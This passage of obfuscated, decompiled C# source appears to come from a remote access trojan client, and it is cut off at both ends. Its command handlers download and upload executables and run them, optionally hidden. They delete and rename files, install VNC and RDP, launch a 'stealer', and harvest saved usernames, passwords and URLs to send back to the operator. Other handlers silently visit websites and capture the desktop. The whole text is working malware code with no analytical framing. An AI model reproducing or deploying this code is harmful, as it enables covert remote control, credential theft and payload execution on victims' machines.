      䛠䄱憪ﰕ牠ꌏ\uE095찌\u2311렄줦回\u0BD8\u33EC\uFFFD裋琚\uE719䉉欎 = command,
      쨛ゐ쐶豧嬫\uFFFD沇꽍\uE912廎礽ᶩῚ燮릑莏翬\uF67C䎕鳌 = client
    }.撜\uE579ļ捐ౠ娏䃧ᴉ옎訉朗뇢錄\u235B㝱ƀ勎頍ኹ铤)).Start();
  }

  public static void \uAACB䍇\u2FFF閽\uE9E9툣鯤궶蕵ቧ᠖\u2327뾂ṃӽ泈ԛ兩䋎廋(
    DoDownloadFileCancel command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    if (匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.錒锾撷췚폰ㇰ윱ၟﵥ牌래䌊軍凵靚ᵀ킈䟖ೖ猋.ContainsKey(command.ID))
      return;
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.錒锾撷췚폰ㇰ윱ၟﵥ牌래䌊軍凵靚ᵀ킈䟖ೖ猋.Add(command.ID, "canceled");
    new DoDownloadFileResponse(command.ID, "canceled", new byte[0], -1, -1, "Canceled").Execute(client);
  }

  public static void 騷ᮀ㸮荸낗\uECAF蜗䥆셗郠餞\uA70A萿\uFFFDꔸ봶鮙惬겄\u4DCD(
    DoUploadFile command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    if (command.CurrentBlock == 0 && System.IO.File.Exists(command.RemotePath))
      洈如ӏĢ묰\uE91B뎼腾\u066Cᓾ欐뽏粑ﮛ廻魪\u2974龬㰺㯦.䙁ڑ엶錄啳뒂겻蔺筃䡍וּ\uF35Eꑺ隁续\uFFFD춨埿䍳⃜(command.RemotePath);
    new \u181Fዱↂ突\uAB0F廠\u2454륫\u26F9㠂䒖\u0FEB慥䡋\uEC55磺扩썜ﺤ梘(command.RemotePath).먯熚䀍\uE766ᖌ㜰垺ƛ䋽㟎ꝷ\uF2AE탛Ї复샆\uE763ষ䤌랶(command.Block, command.CurrentBlock);
  }

  public static void \u2336ཹ\u0B49을㓒흪濞깻ﬆ옶䙝㐧쐱\uEFBC奆\u0CD8ꤑྠࠂ\uF426(
    DoPathDelete command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.崤엎銪\uF46A節㭵墼\u1738櫡䤥鱦ﻙἤἫ㔈\uEB13傝푱\uEBAC\u28F1 崤엎銪節㭵墼櫡䤥鱦ﻙἤἫ㔈傝푱 = new 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.崤엎銪\uF46A節㭵墼\u1738櫡䤥鱦ﻙἤἫ㔈\uEB13傝푱\uEBAC\u28F1();
    // ISSUE: reference to a compiler-generated field
    崤엎銪節㭵墼櫡䤥鱦ﻙἤἫ㔈傝푱.焮诈빝鯂䂵\u2037\u0B78שׂ\uE572⁦辌ર㔵俕䯀젩꣠慧\uA6F7䏭 = false;
    // ISSUE: reference to a compiler-generated field
    崤엎銪節㭵墼櫡䤥鱦ﻙἤἫ㔈傝푱.舠ᙈ\u2AAF\uFFFD\u2653\uF080शꐋｂ䉐\u27E3ᵟ\u0A58ﯘ犈\uEA7D\u2A24\uE29Cⵝ쳺 = (string) null;
    // ISSUE: reference to a compiler-generated method
    Action<string> action = new Action<string>(崤엎銪節㭵墼櫡䤥鱦ﻙἤἫ㔈傝푱.놛靑\uFBC2癋Ἷ镊뒉棔솨貆㯕\uE206殹厰\u0A0EΠ魰煓뗦\uEB4F);
    try
    {
      switch (command.PathType)
      {
        case 娚숺坅\uFFFD䦙\u2953蚛\uF449ꮣ\uE2CF焇ኅ돡컭㕖筣\u325E\u0EFA̗洑.踧ʜ栬咴몌颛ꓵ蜢九꼥锂䏜翍䑬刦㵰\u25D4㑌\u0EE5竼:
          System.IO.File.Delete(command.Path);
          new SetStatusFileManager("Deleted file", false).Execute(client);
          break;
        case 娚숺坅\uFFFD䦙\u2953蚛\uF449ꮣ\uE2CF焇ኅ돡컭㕖筣\u325E\u0EFA̗洑.鏠\u02FE랃僁総㤭嘏\u0A78\u2FA1ٹ뭉\uE10C\uEAF1\u2EF6竇竺褱\u009B\uA4C3ʕ:
          Directory.Delete(command.Path, true);
          new SetStatusFileManager("Deleted directory", false).Execute(client);
          break;
      }
      匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.緲捝\uA4B0뻫蝏晽ꖃ唃\uEAD0鶳੮淑Ēኔ㕬ៈ每V亖轢(new GetDirectory(Path.GetDirectoryName(command.Path)), client);
    }
    catch (UnauthorizedAccessException ex)
    {
      action("DeletePath No permission");
    }
    catch (PathTooLongException ex)
    {
      action("DeletePath Path too long");
    }
    catch (DirectoryNotFoundException ex)
    {
      action("DeletePath Path not found");
    }
    catch (IOException ex)
    {
      action("DeletePath I/O error");
    }
    catch (Exception ex)
    {
      action("DeletePath Failed");
    }
    finally
    {
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      if (崤엎銪節㭵墼櫡䤥鱦ﻙἤἫ㔈傝푱.焮诈빝鯂䂵\u2037\u0B78שׂ\uE572⁦辌ર㔵俕䯀젩꣠慧\uA6F7䏭 && !string.IsNullOrEmpty(崤엎銪節㭵墼櫡䤥鱦ﻙἤἫ㔈傝푱.舠ᙈ\u2AAF\uFFFD\u2653\uF080शꐋｂ䉐\u27E3ᵟ\u0A58ﯘ犈\uEA7D\u2A24\uE29Cⵝ쳺))
      {
        // ISSUE: reference to a compiler-generated field
        new SetStatusFileManager(崤엎銪節㭵墼櫡䤥鱦ﻙἤἫ㔈傝푱.舠ᙈ\u2AAF\uFFFD\u2653\uF080शꐋｂ䉐\u27E3ᵟ\u0A58ﯘ犈\uEA7D\u2A24\uE29Cⵝ쳺, false).Execute(client);
      }
    }
  }

  public static void 䅌䴲歴熾ꈬ㨅娎ᗉꌝ鳶薅ﱜ揊\u1C8FᐲꈢԲꄎ䲩Ě(
    DoPathRename command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.骋얞ᖰꗡൿ鉠衖잎며\uF489\uEF4D\u2A32풸\uEDF3뙨ꞡ䟜\uF337菊䐪 骋얞ᖰꗡൿ鉠衖잎며풸뙨ꞡ䟜菊䐪 = new 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.骋얞ᖰꗡൿ鉠衖잎며\uF489\uEF4D\u2A32풸\uEDF3뙨ꞡ䟜\uF337菊䐪();
    // ISSUE: reference to a compiler-generated field
    骋얞ᖰꗡൿ鉠衖잎며풸뙨ꞡ䟜菊䐪.溉켘袗蕛\u0896뀏诊䭢윏ꅮ㳏쐶斅컔칛\uEC38㵦Ⴍꖽ뀷 = false;
    // ISSUE: reference to a compiler-generated field
    骋얞ᖰꗡൿ鉠衖잎며풸뙨ꞡ䟜菊䐪.ଟ\uEF8Cꗏ똢햚쏕냨\uF61E䳟黪भ朠뵼祢绰\uE01CⴔҘꓠ\uFFFD = (string) null;
    // ISSUE: reference to a compiler-generated method
    Action<string> action = new Action<string>(骋얞ᖰꗡൿ鉠衖잎며풸뙨ꞡ䟜菊䐪.䠖\u0B7C齊뼚췝쭎ὢ\u33E1珄巃欝쭝ᎆ뮰᭑꧱᠗\uF62C職㫪);
    try
    {
      switch (command.PathType)
      {
        case 娚숺坅\uFFFD䦙\u2953蚛\uF449ꮣ\uE2CF焇ኅ돡컭㕖筣\u325E\u0EFA̗洑.踧ʜ栬咴몌颛ꓵ蜢九꼥锂䏜翍䑬刦㵰\u25D4㑌\u0EE5竼:
          System.IO.File.Move(command.Path, command.NewPath);
          new SetStatusFileManager("Renamed file", false).Execute(client);
          break;
        case 娚숺坅\uFFFD䦙\u2953蚛\uF449ꮣ\uE2CF焇ኅ돡컭㕖筣\u325E\u0EFA̗洑.鏠\u02FE랃僁総㤭嘏\u0A78\u2FA1ٹ뭉\uE10C\uEAF1\u2EF6竇竺褱\u009B\uA4C3ʕ:
          Directory.Move(command.Path, command.NewPath);
          new SetStatusFileManager("Renamed directory", false).Execute(client);
          break;
      }
      匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.緲捝\uA4B0뻫蝏晽ꖃ唃\uEAD0鶳੮淑Ēኔ㕬ៈ每V亖轢(new GetDirectory(Path.GetDirectoryName(command.NewPath)), client);
    }
    catch (UnauthorizedAccessException ex)
    {
      action("RenamePath No permission");
    }
    catch (PathTooLongException ex)
    {
      action("RenamePath Path too long");
    }
    catch (DirectoryNotFoundException ex)
    {
      action("RenamePath Path not found");
    }
    catch (IOException ex)
    {
      action("RenamePath I/O error");
    }
    catch (Exception ex)
    {
      action("RenamePath Failed");
    }
    finally
    {
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      if (骋얞ᖰꗡൿ鉠衖잎며풸뙨ꞡ䟜菊䐪.溉켘袗蕛\u0896뀏诊䭢윏ꅮ㳏쐶斅컔칛\uEC38㵦Ⴍꖽ뀷 && !string.IsNullOrEmpty(骋얞ᖰꗡൿ鉠衖잎며풸뙨ꞡ䟜菊䐪.ଟ\uEF8Cꗏ똢햚쏕냨\uF61E䳟黪भ朠뵼祢绰\uE01CⴔҘꓠ\uFFFD))
      {
        // ISSUE: reference to a compiler-generated field
        new SetStatusFileManager(骋얞ᖰꗡൿ鉠衖잎며풸뙨ꞡ䟜菊䐪.ଟ\uEF8Cꗏ똢햚쏕냨\uF61E䳟黪भ朠뵼祢绰\uE01CⴔҘꓠ\uFFFD, false).Execute(client);
      }
    }
  }

  public static void 꽛횛ᖋ\uF022\uE5C4攋\uA831ᖀ囱\uFFFD䋛\u2FA1蛑꾕䔎闽엹䉀㢘蜴(
    DoDownloadAndExecute command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.娓䱪謤ꓱ\uE264脇\u0EE6旇\u2A27臨凰釜본\u1FDD紿暌銪䁖ꚯ뒰 娓䱪謤ꓱ脇旇臨凰釜본紿暌銪䁖ꚯ뒰 = new 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.娓䱪謤ꓱ\uE264脇\u0EE6旇\u2A27臨凰釜본\u1FDD紿暌銪䁖ꚯ뒰();
    // ISSUE: reference to a compiler-generated field
    娓䱪謤ꓱ脇旇臨凰釜본紿暌銪䁖ꚯ뒰.\uE220搘藺䦶趹ପ鈤\uFFFD澿\u27B8橠יִ芫Ꜥ텤䭋웷逐釋Ơ = command;
    // ISSUE: reference to a compiler-generated field
    娓䱪謤ꓱ脇旇臨凰釜본紿暌銪䁖ꚯ뒰.낥̏\uE94E\uA7DF珉勛\uEB9F迫䕦챲\u27E9\uE2A1\u2E97\u295A禳逳\u0BD5ʮꅃꄨ = client;
    // ISSUE: reference to a compiler-generated field
    new SetStatus("Downloading file...").Execute(娓䱪謤ꓱ脇旇臨凰釜본紿暌銪䁖ꚯ뒰.낥̏\uE94E\uA7DF珉勛\uEB9F迫䕦챲\u27E9\uE2A1\u2E97\u295A禳逳\u0BD5ʮꅃꄨ);
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(娓䱪謤ꓱ脇旇臨凰釜본紿暌銪䁖ꚯ뒰.봱곫嘖\uF167狅殬\uFB08띆\u1AEC觊ҿᕶ\u2302웮ꓳ챆裎莐腾\uEE28)).Start();
  }

  public static void ᘱצּ鲐솅㻡咶\uFFFD菲몯闅ꇿ痭㬡ゐ\uE274\uE967덎攩䳛ẩ(
    DoInstallVNC command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.蛚筄墁璈쉭쾃ؚꇪ\uFFFDɡ泺ᗋ쬧偍詞\uFFFD闱쁱㢬\uA82E 蛚筄墁璈쉭쾃ؚꇪɡ泺ᗋ쬧偍詞闱쁱㢬 = new 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.蛚筄墁璈쉭쾃ؚꇪ\uFFFDɡ泺ᗋ쬧偍詞\uFFFD闱쁱㢬\uA82E();
    // ISSUE: reference to a compiler-generated field
    蛚筄墁璈쉭쾃ؚꇪɡ泺ᗋ쬧偍詞闱쁱㢬.鳳銒\u060B㫠㫲續멿蛲慐阚͈䝟뻙짰큊\u2522嘶驐段\uFFFD = command;
    // ISSUE: reference to a compiler-generated field
    蛚筄墁璈쉭쾃ؚꇪɡ泺ᗋ쬧偍詞闱쁱㢬.\uFE68盵뙥拒\u291B\u25D6ֺ\uFAFF膽쏪专ླ\uFFFD躣蒵댨ޯā\u136CꝒ = client;
    // ISSUE: reference to a compiler-generated field
    new SetStatus("Installing VNC...").Execute(蛚筄墁璈쉭쾃ؚꇪɡ泺ᗋ쬧偍詞闱쁱㢬.\uFE68盵뙥拒\u291B\u25D6ֺ\uFAFF膽쏪专ླ\uFFFD躣蒵댨ޯā\u136CꝒ);
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(蛚筄墁璈쉭쾃ؚꇪɡ泺ᗋ쬧偍詞闱쁱㢬.乳\u0889퀊撝檬鍊辅쪋\u2823싸㚤ᮈ\u21AD䎠镎\u23C7왆\u20F8法旇)).Start();
  }

  public static void \uFFFD뢛얖ᇝ\u0CF5\uE527㧙\u3298ꭃ\u2A73ෟ\u28BFⰱ\uE210ﱦ笼뼃\uFFFD죬啡(
    DoInstallRDP command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.섷\uEAF1鲔塪\u23AD鏁蛁\u0A45앪鈇\uE4C9\uE841犐즽୯ﬖꎙ\uE85B漃㥸 섷鲔塪鏁蛁앪鈇犐즽୯ﬖꎙ漃㥸 = new 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.섷\uEAF1鲔塪\u23AD鏁蛁\u0A45앪鈇\uE4C9\uE841犐즽୯ﬖꎙ\uE85B漃㥸();
    // ISSUE: reference to a compiler-generated field
    섷鲔塪鏁蛁앪鈇犐즽୯ﬖꎙ漃㥸.庨\uF558铬绖ᔏ赂\u22CD\uE487\u2977柿\u0C0D㘾뻴뵬挹ઉꖻ벊䩎飧 = command;
    // ISSUE: reference to a compiler-generated field
    섷鲔塪鏁蛁앪鈇犐즽୯ﬖꎙ漃㥸.뵨ꋶ䃢ꩰ諍豌ᖵ⃥罵퐌ᒵ\u0FFD\u2ED9\uEEC4ᇨ\u175B\uEFA3误擄켇 = client;
    // ISSUE: reference to a compiler-generated field
    new SetStatus("Installing RDP...").Execute(섷鲔塪鏁蛁앪鈇犐즽୯ﬖꎙ漃㥸.뵨ꋶ䃢ꩰ諍豌ᖵ⃥罵퐌ᒵ\u0FFD\u2ED9\uEEC4ᇨ\u175B\uEFA3误擄켇);
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(섷鲔塪鏁蛁앪鈇犐즽୯ﬖꎙ漃㥸.耐먋㐴萦䅛픓麹碨佛壃식橜왚帆ೀ\uF36A鉾\uE742ﾗ㹉)).Start();
  }

  public static void 쁝\uEBB7糖錹\u2525쒶꯲ꆿꤧꜘ蔼똨ꪌ竁\uE7B9훔༧珔阚\uEEE4(
    DoStealer command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uE07E\u19E3䝷ꠧ잻\u2B51훏틿㤥Đ飗散赢론\u29F8䁰쇦\u0CD2暮\uF8F9 䝷ꠧ잻훏틿㤥Đ飗散赢론䁰쇦暮 = new 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uE07E\u19E3䝷ꠧ잻\u2B51훏틿㤥Đ飗散赢론\u29F8䁰쇦\u0CD2暮\uF8F9();
    // ISSUE: reference to a compiler-generated field
    䝷ꠧ잻훏틿㤥Đ飗散赢론䁰쇦暮.一Ἴ\u3097猶ӡ惙뤯㐕떁襊Ղ䂐\u2841管椨\uF36B킖瓞ꞁ퍞 = command;
    // ISSUE: reference to a compiler-generated field
    䝷ꠧ잻훏틿㤥Đ飗散赢론䁰쇦暮.榜煫\u0ECE腛\u0C78第\u21FEꀉ㦨㯉雪\uF8AF遂키\uFFFD霭ᛙ竴뚍铍 = client;
    // ISSUE: reference to a compiler-generated field
    new SetStatus("Stealer Unleashed....").Execute(䝷ꠧ잻훏틿㤥Đ飗散赢론䁰쇦暮.榜煫\u0ECE腛\u0C78第\u21FEꀉ㦨㯉雪\uF8AF遂키\uFFFD霭ᛙ竴뚍铍);
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(䝷ꠧ잻훏틿㤥Đ飗散赢론䁰쇦暮.\u2A4Eᡁ꩙蔲俗犏퐊䰞ઃ\u2AFE\uFFFD\u22BC\uF2EE吜\uEC9E搥虑\uF314\u28EE숯)).Start();
  }

  public static void 븷ꜷᠾி\uFFFD虾\uF1BC펑ହ㤽ꐶ숈\u2E57\u226Dヶ胅\uFFFD\u2A24绘뚷(
    DoUploadAndExecute command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    if (!匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\u32D8龵閶쏜旱\uE356ߞ\u0FFC熂啟\uEDE5\uF5EF헓ஂ\u33A5㡨箥ꗞ\uF507\uEC57.ContainsKey(command.ID))
      匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\u32D8龵閶쏜旱\uE356ߞ\u0FFC熂啟\uEDE5\uF5EF헓ஂ\u33A5㡨箥ꗞ\uF507\uEC57.Add(command.ID, \uEB4A曭弻騯\uFFFDᑱ遲젆徏둂省퀓싗\u175F觳崀\uEEE1錱Ἂፋ.\uFFFD\u33F3웍֓蹚\uF347댷랣\uE02A輶卯ί\u323F煭촥뫢\uE32F\uFFFD왜㳺(Path.GetExtension(command.FileName)));
    string str = 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\u32D8龵閶쏜旱\uE356ߞ\u0FFC熂啟\uEDE5\uF5EF헓ஂ\u33A5㡨箥ꗞ\uF507\uEC57[command.ID];
    try
    {
      if (command.CurrentBlock == 0 && Path.GetExtension(str) == ".exe" && !\uEB4A曭弻騯\uFFFDᑱ遲젆徏둂省퀓싗\u175F觳崀\uEEE1錱Ἂፋ.碤퉠㝌颺갔\uE687\u0B4E럻娜㰰\uF102ㅪ읶\uF731暦鼂缈ﰔ㾼\u2BEF(command.Block))
        throw new Exception("No executable file");
      \u181Fዱↂ突\uAB0F廠\u2454륫\u26F9㠂䒖\u0FEB慥䡋\uEC55磺扩썜ﺤ梘 ዱↂ突廠륫㠂䒖慥䡋磺扩썜ﺤ梘 = new \u181Fዱↂ突\uAB0F廠\u2454륫\u26F9㠂䒖\u0FEB慥䡋\uEC55磺扩썜ﺤ梘(str);
      if (!ዱↂ突廠륫㠂䒖慥䡋磺扩썜ﺤ梘.먯熚䀍\uE766ᖌ㜰垺ƛ䋽㟎ꝷ\uF2AE탛Ї复샆\uE763ষ䤌랶(command.Block, command.CurrentBlock))
        throw new Exception(ዱↂ突廠륫㠂䒖慥䡋磺扩썜ﺤ梘.LastError);
      if (command.CurrentBlock + 1 != command.MaxBlocks)
        return;
      if (匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\u32D8龵閶쏜旱\uE356ߞ\u0FFC熂啟\uEDE5\uF5EF헓ஂ\u33A5㡨箥ꗞ\uF507\uEC57.ContainsKey(command.ID))
        匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\u32D8龵閶쏜旱\uE356ߞ\u0FFC熂啟\uEDE5\uF5EF헓ஂ\u33A5㡨箥ꗞ\uF507\uEC57.Remove(command.ID);
      \uEB4A曭弻騯\uFFFDᑱ遲젆徏둂省퀓싗\u175F觳崀\uEEE1錱Ἂፋ.劉\uECE2쥓蠔웇ô۪\uEB4Eᇸ\u1AED褬馤곍꾔勔鬦ཚ\u086B\u218B巉(str);
      ProcessStartInfo startInfo = new ProcessStartInfo();
      if (command.RunHidden)
      {
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        startInfo.CreateNoWindow = true;
      }
      startInfo.UseShellExecute = false;
      startInfo.FileName = str;
      Process.Start(startInfo);
      new SetStatus("Executed File!").Execute(client);
    }
    catch (Exception ex)
    {
      if (匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\u32D8龵閶쏜旱\uE356ߞ\u0FFC熂啟\uEDE5\uF5EF헓ஂ\u33A5㡨箥ꗞ\uF507\uEC57.ContainsKey(command.ID))
        匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\u32D8龵閶쏜旱\uE356ߞ\u0FFC熂啟\uEDE5\uF5EF헓ஂ\u33A5㡨箥ꗞ\uF507\uEC57.Remove(command.ID);
      洈如ӏĢ묰\uE91B뎼腾\u066Cᓾ欐뽏粑ﮛ廻魪\u2974龬㰺㯦.䙁ڑ엶錄啳뒂겻蔺筃䡍וּ\uF35Eꑺ隁续\uFFFD춨埿䍳⃜(str);
      new SetStatus("Execution failed: " + ex.Message).Execute(client);
    }
  }

  public static void 뚫ㄬ\uE5E5䠩\uEF69퇮齼\uE216\u0885ꏠ\uAAFC训换圗뙜鎚嶑㨩㼌Ꙣ(
    DoVisitWebsite command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    string str = command.URL;
    if (!str.StartsWith("http"))
      str = "http://" + str;
    if (!Uri.IsWellFormedUriString(str, UriKind.RelativeOrAbsolute))
      return;
    if (!command.Hidden)
    {
      Process.Start(str);
    }
    else
    {
      try
      {
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(str);
        httpWebRequest.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A";
        httpWebRequest.AllowAutoRedirect = true;
        httpWebRequest.Timeout = 10000;
        httpWebRequest.Method = "GET";
        using ((HttpWebResponse) httpWebRequest.GetResponse())
          ;
      }
      catch
      {
      }
    }
    new SetStatus("Visited Website").Execute(client);
  }

  public static void \u2312뺶뢰烆拁ހ맙͢嚶̠껮踩ɥ뉧倢ꄸ\uF8EF\u28AB쪑\u009D(
    DoShowMessageBox command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(new 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\u2F88后뙥暧\uA7ECꈇ锔㽌債豯\uE9D6뤈邷ఱ턲\uEAE9篱\u265C悶犃()
    {
      \uEA3D躏㵻㡃ᙪ労辶㠄刵䱼躞샓\uF050᳧輧搗\u2FCC\uFFFD݇䬌 = command
    }.ᙧ㓧鳧\u2CF5郛ꤩ\uEA91伶扅먳戦柅㪕邖濋䅓\u1CBDṧ\u3190䮾)).Start();
    new SetStatus("Showed Messagebox").Execute(client);
  }

  public static void ᣘ퓴\uF2DAᰥ\u2A74籞䘄녟㬄碤\uED0Eꑺ噣粥暐ѷ䓵옼珌ᩱ(
    GetPasswords packet,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    List<麗椎퀻婸멑മॖ㝶哊फ\uF317袘\u0ACAᤫ諳樲쏥螠룶鯀> 麗椎퀻婸멑മॖ㝶哊फ袘ᤫ諳樲쏥螠룶鯀List = new List<麗椎퀻婸멑മॖ㝶哊फ\uF317袘\u0ACAᤫ諳樲쏥螠룶鯀>();
    List<string> data = new List<string>();
    for (int index = 0; index < 麗椎퀻婸멑മॖ㝶哊फ袘ᤫ諳樲쏥螠룶鯀List.Count; ++index)
    {
      麗椎퀻婸멑മॖ㝶哊फ\uF317袘\u0ACAᤫ諳樲쏥螠룶鯀 麗椎퀻婸멑മॖ㝶哊फ袘ᤫ諳樲쏥螠룶鯀 = 麗椎퀻婸멑മॖ㝶哊फ袘ᤫ諳樲쏥螠룶鯀List[index];
      string str = string.Format(麗椎퀻婸멑മॖ㝶哊फ袘ᤫ諳樲쏥螠룶鯀.Username + "$E$" + 麗椎퀻婸멑മॖ㝶哊फ袘ᤫ諳樲쏥螠룶鯀.Password + "$E$" + 麗椎퀻婸멑മॖ㝶哊फ袘ᤫ諳樲쏥螠룶鯀.URL + "$E$" + 麗椎퀻婸멑മॖ㝶哊फ袘ᤫ諳樲쏥螠룶鯀.Application);
      data.Add(str);
    }
    new GetPasswordsResponse(data).Execute(client);
  }

  public static void 妊ꈜ锊嘲怺\uF226䍮狟\uF6FE뚨䋅㱫ㇽ戤㷑젳醼\u2429鈸받(
    GetDesktop command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    string resolution = ﾘ皹陵崎瑭쮶묻園䜡곎艔ꄗ̫るᷚư곀ꚠꛬ㢜.\uED6C跘뎆퀪妟囧텴\u2E4C츀㝽ᘰ嶜Ʈ咣\uFE6A埛髦ፖ宠췀(걄\uE704락艿\uE5A8倩\uF830箔泻髇䠽\u10FB非䶓붇弝䬆ᷟ䵑䔥.廄盯\u333A떯\u4DE0皰珒\uEFF3\u9FE3腛ఽ\u09F2ࠫ\uE7D3\uE2A9ᇟ慚쓕덾Ꙫ(command.Monitor));
    if (匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uED4D늸멗䤺䰽麠\uE80Eᷥ값䜿钬쭙ꋐ깻僷\uEEB9䆺\uFFFD晷髍 == null)
      匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uED4D늸멗䤺䰽麠\uE80Eᷥ값䜿钬쭙ꋐ깻僷\uEEB9䆺\uFFFD晷髍 = new UnsafeStreamCodec(command.Quality, command.Monitor, resolution);
    if (匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uED4D늸멗䤺䰽麠\uE80Eᷥ값䜿钬쭙ꋐ깻僷\uEEB9䆺\uFFFD晷髍.ImageQuality != command.Quality || 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uED4D늸멗䤺䰽麠\uE80Eᷥ값䜿钬쭙ꋐ깻僷\uEEB9䆺\uFFFD晷髍.Monitor != command.Monitor || 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uED4D늸멗䤺䰽麠\uE80Eᷥ값䜿钬쭙ꋐ깻僷\uEEB9䆺\uFFFD晷髍.Resolution != resolution)
    {
      匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uED4D늸멗䤺䰽麠\uE80Eᷥ값䜿钬쭙ꋐ깻僷\uEEB9䆺\uFFFD晷髍?.Dispose();
